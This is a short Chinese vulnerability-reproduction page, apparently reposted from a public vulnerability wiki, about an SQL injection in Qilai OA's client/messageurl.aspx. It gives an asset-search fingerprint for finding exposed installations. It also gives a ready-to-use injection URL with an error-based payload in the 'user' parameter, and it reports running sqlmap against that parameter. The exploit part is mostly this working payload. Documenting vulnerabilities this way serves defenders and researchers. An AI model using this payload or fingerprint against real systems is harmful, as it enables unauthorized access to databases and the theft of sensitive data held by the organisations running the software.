---
title: "启莱OA messageurl.aspx SQL注入漏洞"
date: 2026-10-17 09:12:12
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "启莱OA"
tags:
  - "启莱OA"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

```
启莱OA
```

## 网络测绘

```
app="启莱OA"
```

## 漏洞复现

登录页面如下

![qilai-2-1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/qilai-2-1.png)

存在SQL注入的文件为 messageurl.aspx

```plain
http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1
```

![qilai-2-2](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/qilai-2-2.png)

使用SQLmap对参数 user 进行注入

![qilai-2-3](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/qilai-2-3.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E5%90%AF%E8%8E%B1OA-messageurl.aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
